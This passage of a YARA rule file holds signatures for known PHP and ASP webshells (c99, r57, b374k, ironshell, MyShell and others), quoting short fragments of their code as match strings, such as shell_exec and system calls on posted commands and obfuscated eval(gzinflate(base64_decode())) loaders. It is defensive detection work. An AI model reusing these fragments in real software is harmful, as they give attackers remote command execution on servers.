        hash1 = "4a44d82da21438e32d4f514ab35c26b6"
        hash2 = "f618f41f7ebeb5e5076986a66593afd1"

    strings:
        $s2 = "echo $uname.\"</font><br><b>\";" fullword
        $s3 = "while(!feof($f)) { $res.=fread($f,1024); }" fullword
        $s4 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()"
    condition:
        2 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_SpecialShell_99_php_php {
    meta:
        id = "6VLrLVXrRO4Z0IDS03YPWZ"
        fingerprint = "v1_sha256_0f44dc1ff243b234a718e8dbd5cc8c4dc8eb9d3b63300a5c6ff72b86280607bf"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, SpecialShell_99.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "3ca5886cd54d495dc95793579611f59a"
        hash2 = "9c5bb5e3a46ec28039e8986324e42792"
        hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
        hash4 = "09609851caa129e40b0d56e90dfc476c"

    strings:
        $s0 = "c99ftpbrutecheck"
        $s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
        $s2 = "$fqb_lenght = $nixpwdperpage;" fullword
        $s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword
    condition:
        2 of them
}
rule _w_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php {
    meta:
        id = "2MVddus8j2i2e6OfweStrH"
        fingerprint = "v1_sha256_e9cd7425b806f71d8889f5df7f3fc2f4a692279fc4e495104646cfe28c5b5fe5"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "9c5bb5e3a46ec28039e8986324e42792"
        hash2 = "d8ae5819a0a2349ec552cbcf3a62c975"
        hash3 = "9e9ae0332ada9c3797d6cee92c2ede62"
        hash4 = "09609851caa129e40b0d56e90dfc476c"

    strings:
        $s0 = "$sqlquicklaunch[] = array(\""
        $s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<"
    condition:
        all of them
}
rule _antichat_php_php_Fatalshell_php_php_a_gedit_php_php {
    meta:
        id = "Urx4GUtbwx8Map835ggEl"
        fingerprint = "v1_sha256_789340845aeed4accaef02afa1a1fe420e73b6f5af1b621f4ec2342994045278"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "128e90b5e2df97e21e96d8e268cde7e3"
        hash1 = "b15583f4eaad10a25ef53ab451a4a26d"
        hash2 = "ab9c6b24ca15f4a1b7086cad78ff0f78"

    strings:
        $s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
        $s1 = "if($action==\"phpeval\"){" fullword
        $s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
        $s3 = "$dir=getcwd().\"/\";" fullword
    condition:
        2 of them
}
rule _c99shell_v1_0_php_php_c99php_SsEs_php_php {
    meta:
        id = "38OcyW6KS0ebovVBD3QGw7"
        fingerprint = "v1_sha256_b2bdf4187ff3d63e4af5c70e8cc93cd8fac3257b33c38764ad2bb2e206066162"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
        hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
        hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"

    strings:
        $s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}" fullword
    condition:
        1 of them
}
rule _Crystal_php_nshell_php_php_load_shell_php_php {
    meta:
        id = "5QMcYBjW6b6BHOSf8G9VQ8"
        fingerprint = "v1_sha256_71a9310b19b66e3699f75f551cc604f535ea843eb9c50f4a009edcd9c11e01b9"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "fdbf54d5bf3264eb1c4bff1fac548879"
        hash1 = "4a44d82da21438e32d4f514ab35c26b6"
        hash2 = "0c5d227f4aa76785e4760cdcff78a661"

    strings:
        $s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
        $s1 = "$dires = $dires . $directory;" fullword
        $s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword
    condition:
        2 of them
}
rule _nst_php_php_cybershell_php_php_img_php_php_nstview_php_php {
    meta:
        id = "3aQFKEebBcJtH159ez8xxs"
        fingerprint = "v1_sha256_afc0b1c83644aa323d308471e5978b6b03f444f5f46fbaddac28ff42d524df1e"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
        hash1 = "ef8828e0bc0641a655de3932199c0527"
        hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
        hash3 = "4745d510fed4378e4b1730f56f25e569"

    strings:
        $s0 = "@$rto=$_POST['rto'];" fullword
        $s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
        $s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword
    condition:
        2 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_dC3_Security_Crew_Shell_PRiV_php_SpecialShell_99_php_php {
    meta:
        id = "3Ams7LVZKwP6HElNdXX0k"
        fingerprint = "v1_sha256_7a4c74912caa1855efc3a2ea7fa6d0082f62776d77a211e59f12892d4883f240"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, dC3 Security Crew Shell PRiV.php.txt, SpecialShell_99.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "3ca5886cd54d495dc95793579611f59a"
        hash2 = "9c5bb5e3a46ec28039e8986324e42792"
        hash3 = "433706fdc539238803fd47c4394b5109"
        hash4 = "09609851caa129e40b0d56e90dfc476c"

    strings:
        $s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":"
        $s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";" fullword
    condition:
        all of them
}
rule _c99shell_v1_0_php_php_c99php_1_c2007_php_php_c100_php {
    meta:
        id = "1FQYq4OvqyWm3mgZyNSb0B"
        fingerprint = "v1_sha256_a5dc73a12d8c8b89bab77b90cb3b561e9daf9db5f5ad550326a2fbce52c1c8da"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
        hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
        hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
        hash3 = "d089e7168373a0634e1ac18c0ee00085"
        hash4 = "38fd7e45f9c11a37463c3ded1c76af4c"

    strings:
        $s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword
    condition:
        all of them
}
rule multiple_php_webshells_2 {
    meta:
        id = "3SR2qQMI8AVA6nh9fZAl8I"
        fingerprint = "v1_sha256_26fe586ba7f4d1931b2df81aa27543ff422e699fd56b6b1be289a0f8d6954691"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt, ctt_sh.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "3ca5886cd54d495dc95793579611f59a"
        hash2 = "9c5bb5e3a46ec28039e8986324e42792"
        hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
        hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
        hash5 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
        hash6 = "09609851caa129e40b0d56e90dfc476c"
        hash7 = "671cad517edd254352fe7e0c7c981c39"

    strings:
        $s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I"
        $s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma"
        $s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword
    condition:
        all of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_1_SpecialShell_99_php_php {
    meta:
        id = "6bPyFGm3rcoi9MPPa75wIx"
        fingerprint = "v1_sha256_160adf93d4f9e51022c427b2b0601207dd9ca917e98d99e2013fe83e09a85d21"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "3ca5886cd54d495dc95793579611f59a"
        hash2 = "9c5bb5e3a46ec28039e8986324e42792"
        hash3 = "44542e5c3e9790815c49d5f9beffbbf2"
        hash4 = "09609851caa129e40b0d56e90dfc476c"

    strings:
        $s0 = "if ($total === FALSE) {$total = 0;}" fullword
        $s1 = "$free_percent = round(100/($total/$free),2);" fullword
        $s2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}" fullword
        $s3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);" fullword
    condition:
        2 of them
}
rule _r577_php_php_r57_php_php_spy_php_php_s_php_php {
    meta:
        id = "3fb7dEOyKdXGCPBORuhH8Q"
        fingerprint = "v1_sha256_7ba3d6927dc06bfcd98ee9d7146164ca9a9024ef26eac60fabc8ed1375db618d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
        hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
        hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
        hash3 = "817671e1bdc85e04cc3440bbd9288800"

    strings:
        $s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
        $s2 = "'eng_text30'=>'Cat file'," fullword
        $s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword
    condition:
        1 of them
}
rule _nixrem_php_php_c99shell_v1_0_php_php_c99php_NIX_REMOTE_WEB_SHELL_v_0_5_alpha_Lite_Public_Version_php {
    meta:
        id = "4QBB1tXed1Fvyxc7IIkeqE"
        fingerprint = "v1_sha256_f7575db2c8f147d03d5b93b431d1a73c4182b5db6e801e672914778b2042a712"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files nixrem.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "40a3e86a63d3d7f063a86aab5b5f92c6"
        hash1 = "d8ae5819a0a2349ec552cbcf3a62c975"
        hash2 = "9e9ae0332ada9c3797d6cee92c2ede62"
        hash3 = "f3ca29b7999643507081caab926e2e74"

    strings:
        $s0 = "$num = $nixpasswd + $nixpwdperpage;" fullword
        $s1 = "$ret = posix_kill($pid,$sig);" fullword
        $s2 = "if ($uid) {echo join(\":\",$uid).\"<br>\";}" fullword
        $s3 = "$i = $nixpasswd;" fullword
    condition:
        2 of them
}

/* GIF Header webshell */

rule DarkSecurityTeam_Webshell {
    meta:
        id = "55duW30JAR7j13w44VIwIH"
        fingerprint = "v1_sha256_0c58ed8845cb04d785322b280647d424e1028a3be7e92b2493fd907fae36b16d"
        version = "1.0"
        score = 50
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Dark Security Team Webshell"
        category = "INFO"
        hash = "f1c95b13a71ca3629a0bb79601fcacf57cdfcf768806a71b26f2448f8c1d5d24"

    strings:
        $s0 = "form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\"&HtmlEncode(Server.MapPath(\".\"))&" ascii
    condition:
        1 of them
}

rule GIFCloaked_Webshell_A {
    meta:
        id = "68CKovbMlilcy5gAsHqs9J"
        fingerprint = "v1_sha256_f02e4864f075e0e92514746fb4c21e2d47c45cd9568fd5c7b85893e18594cac5"
        version = "1.0"
        score = 50
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Looks like a webshell cloaked as GIF"
        category = "INFO"
        hash = "f1c95b13a71ca3629a0bb79601fcacf57cdfcf768806a71b26f2448f8c1d5d24"

    strings:
        $magic = { 47 49 46 38 } /* GIF8 ... */
        $s0 = "input type"
        $s1 = "<%eval request"
        $s2 = "<%eval(Request.Item["
        $s3 = "LANGUAGE='VBScript'"
    condition:
        ( $magic at 0 ) and ( 1 of ($s*) )
        and not filepath contains "AppData"
}

rule PHP_Cloaked_Webshell_SuperFetchExec {
    meta:
        id = "5bVDdtc17TsNj8GNHUrpZr"
        fingerprint = "v1_sha256_320b85b1ad39a90578f53c69838b6264af1e6a71c509aefc0986c7f0c77fdae9"
        version = "1.0"
        score = 50
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Looks like a webshell cloaked as GIF - http://goo.gl/xFvioC"
        category = "INFO"
        reference = "http://goo.gl/xFvioC"

    strings:
        $s0 = "else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);"
    condition:
        $s0
}

/* PHP Webshell Update - August 2014 - deducted from https://github.com/JohnTroony/php-webshells */

rule WebShell_RemExp_asp_php {
    meta:
        id = "1nMy5md2x4zhdoLDBFUgmK"
        fingerprint = "v1_sha256_b3cfa44898629ffa20630436ae10a94ad72f0e793d61e1157a4de649aa048fe2"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
        category = "INFO"
        hash = "d9919dcf94a70d5180650de8b81669fa1c10c5a2"

    strings:
        $s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
        $s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
        $s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
        $s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
        $s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword
    condition:
        all of them
}
rule WebShell_dC3_Security_Crew_Shell_PRiV {
    meta:
        id = "3nYz2TkvSR7UnJFC4lrlUY"
        fingerprint = "v1_sha256_f93a5d87d4a490844de578067dc0b7bac6b01ceb9130cd7c70a227566e18f16c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php"
        category = "INFO"
        hash = "1b2a4a7174ca170b4e3a8cdf4814c92695134c8a"

    strings:
        $s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
        $s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
        $s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
        $s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
        $s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
        $s20 = "if (isset($_GET['rename_all'])) {" fullword
    condition:
        3 of them
}
rule WebShell_simattacker {
    meta:
        id = "1el42ebBxO1OvfE4jgOC4z"
        fingerprint = "v1_sha256_323b68f1d31df647775ad16a85b9f90bce4eac89188160a1e4853f8fec680160"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file simattacker.php"
        category = "INFO"
        hash = "258297b62aeaf4650ce04642ad5f19be25ec29c9"

    strings:
        $s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword
        $s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword
        $s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword
        $s6 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
        $s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword
        $s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
        $s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
        $s20 = "$Comments=$_POST['Comments'];" fullword
    condition:
        2 of them
}
rule WebShell_DTool_Pro {
    meta:
        id = "7ETnazvI4n21T962RSuVb4"
        fingerprint = "v1_sha256_da744efb521415fb8817c0982d8d538e1e38b1c0995f43716611df37bf371c38"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file DTool Pro.php"
        category = "INFO"
        hash = "e2ee1c7ba7b05994f65710b7bbf935954f2c3353"

    strings:
        $s1 = "function PHPget(){inclVar(); if(confirm(\"O PHPget agora oferece uma lista pront"
        $s2 = "<font size=3>by r3v3ng4ns - revengans@gmail.com </font>" fullword
        $s3 = "function PHPwriter(){inclVar();var url=prompt(\"[ PHPwriter ] by r3v3ng4ns\\nDig"
        $s11 = "//Turns the 'ls' command more usefull, showing it as it looks in the shell" fullword
        $s13 = "if (@file_exists(\"/usr/bin/wget\")) $pro3=\"<i>wget</i> at /usr/bin/wget, \";" fullword
        $s14 = "//To keep the changes in the url, when using the 'GET' way to send php variables" fullword
        $s16 = "function PHPf(){inclVar();var o=prompt(\"[ PHPfilEditor ] by r3v3ng4ns\\nDigite "
        $s18 = "if(empty($fu)) $fu = @$_GET['fu'];" fullword
    condition:
        3 of them
}
rule WebShell_ironshell {
    meta:
        id = "5pcYrtu9tkHCFoolGF5xYr"
        fingerprint = "v1_sha256_1810071f261ad7390532b07ef24115726f236131aa8ffd29adbde9ebe5085e9d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file ironshell.php"
        category = "INFO"
        hash = "d47b8ba98ea8061404defc6b3a30839c4444a262"

    strings:
        $s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword
        $s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
        $s4 = "error_reporting(0); //If there is an error, we'll show it, k?" fullword
        $s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
        $s15 = "if(!is_numeric($_POST['timelimit']))" fullword
        $s16 = "if($_POST['chars'] == \"9999\")" fullword
        $s17 = "<option value=\\\"az\\\">a - zzzzz</option>" fullword
        $s18 = "print shell_exec($command);" fullword
    condition:
        3 of them
}
rule WebShell_indexer_asp_php {
    meta:
        id = "763dq9XpUzlQbAlGmYoSyL"
        fingerprint = "v1_sha256_c576925c95b5bd2549e8039a1fc6ac228bfab5ddee8c4e12264ea78e9828ba5c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file indexer.asp.php.txt"
        category = "INFO"
        hash = "e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d"

    strings:
        $s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword
        $s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword
        $s2 = "<form action=\"?Gonder\" method=\"post\">" fullword
        $s4 = "<form action=\"?oku\" method=\"post\">" fullword
        $s7 = "var message=\"SaNaLTeRoR - " fullword
        $s8 = "nDexEr - Reader\"" fullword
    condition:
        3 of them
}
rule WebShell_toolaspshell {
    meta:
        id = "4zbGJOwqTDtBccply3LAfW"
        fingerprint = "v1_sha256_cb46d3170a9c144a22ef8c91b381495a471d2aa178a4a123eb9a1e32e1db7683"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file toolaspshell.php"
        category = "INFO"
        hash = "11d236b0d1c2da30828ffd2f393dd4c6a1022e3f"

    strings:
        $s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
        $s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
        $s20 = "destino3 = folderItem.path & \"\\index.asp\"" fullword
    condition:
        2 of them
}
rule WebShell_b374k_mini_shell_php_php {
    meta:
        id = "6AqbPMSz2McPjUPVQusHl1"
        fingerprint = "v1_sha256_553bd775d9662f9410d9ab946ccffe4b2ee92e367bcc6345fa595527653280cf"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
        category = "INFO"
        hash = "afb88635fbdd9ebe86b650cc220d3012a8c35143"

    strings:
        $s0 = "@error_reporting(0);" fullword
        $s2 = "@eval(gzinflate(base64_decode($code)));" fullword
        $s3 = "@set_time_limit(0); " fullword
    condition:
        all of them
}
rule WebShell_Sincap_1_0 {
    meta:
        id = "3i5QEsMLusNINqMylKeeot"
        fingerprint = "v1_sha256_0cb8851285bd55b0b613ec4c46ab88142e2cbba7e527ad510b008cfb342af221"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file Sincap 1.0.php"
        category = "INFO"
        hash = "9b72635ff1410fa40c4e15513ae3a496d54f971c"

    strings:
        $s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
        $s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
        $s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
        $s12 = "while (($ekinci=readdir ($sedat))){" fullword
        $s19 = "$deger2= \"$ich[$tampon4]\";" fullword
    condition:
        2 of them
}
rule WebShell_b374k_php {
    meta:
        id = "2uVXPkE7m6hTTmiGHd09Y8"
        fingerprint = "v1_sha256_f44ecdcf327cf417a90a91c8d23f6137b80c2006bea2ca2e214f2bfdf5793771"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file b374k.php.php"
        category = "INFO"
        hash = "04c99efd187cf29dc4e5603c51be44170987bce2"

    strings:
        $s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
        $s6 = "// password (default is: b374k)"
        $s8 = "//******************************************************************************"
        $s9 = "// b374k 2.2" fullword
        $s10 = "eval(\"?>\".gzinflate(base64_decode("
    condition:
        3 of them
}
rule WebShell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend {
    meta:
        id = "CII0vis0wtteBg6O3ItTA"
        fingerprint = "v1_sha256_63ebb0c673a5aee05d2d9d571ebf63942d826b5148a5f7ed587ba1efbb0dc923"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
        category = "INFO"
        hash = "6454cc5ab73143d72cf0025a81bd1fe710351b44"

    strings:
        $s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword
        $s5 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
        $s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword
        $s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
        $s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
        $s19 = "$Comments=$_POST['Comments'];" fullword
        $s20 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword
    condition:
        3 of them
}
rule WebShell_h4ntu_shell__powered_by_tsoi_ {
    meta:
        id = "gnHczUMVENSDlu82MFYJW"
        fingerprint = "v1_sha256_da5994e3278278920d3e4774850d9b05f0244d2af03d0de92d1466f6f87ca3eb"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php"
        category = "INFO"
        hash = "cbca8cd000e705357e2a7e0cf8262678706f18f9"

    strings:
        $s11 = "<title>h4ntu shell [powered by tsoi]</title>" fullword
        $s13 = "$cmd = $_POST['cmd'];" fullword
        $s16 = "$uname = posix_uname( );" fullword
        $s17 = "if(!$whoami)$whoami=exec(\"whoami\");" fullword
        $s18 = "echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>"
        $s20 = "ob_end_clean();" fullword
    condition:
        3 of them
}
rule WebShell_php_webshells_MyShell {
    meta:
        id = "5RdzXdYBQrW9VqIrKEA5Jo"
        fingerprint = "v1_sha256_2c39ffecb44ce2f936ba3563c6086d8b2ed75aec3b57b45e2a1f5e7321ac9a3f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file MyShell.php"
        category = "INFO"
        hash = "42e283c594c4d061f80a18f5ade0717d3fb2f76d"

    strings:
        $s3 = "<title>MyShell error - Access Denied</title>" fullword
        $s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
        $s5 = "//A workdir has been asked for - we chdir to that dir." fullword
        $s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
        $s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
        $s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
        $s19 = "#every command you excecute." fullword
        $s20 = "<form name=\"shell\" method=\"post\">" fullword
    condition:
        3 of them
}
rule WebShell_php_webshells_pws {
